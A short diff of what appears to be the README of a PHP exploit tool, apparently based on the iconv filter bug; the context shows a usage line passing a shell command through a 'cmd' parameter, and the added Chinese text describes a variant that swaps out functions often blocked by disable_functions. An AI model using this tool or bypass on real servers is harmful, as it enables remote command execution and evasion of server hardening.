@@ -34,3 +34,7 @@ libc_path = './libc-2.23.so'
 
 /php-filter-iconv.php?cmd=curl 127.0.0.1:8888&run=1
 
+## php-filter-iconv_bypass_fopen.php用法
+
+移除了fopen, pack, str_repeat这些可能被disable_functions的函数，找了替代品
+
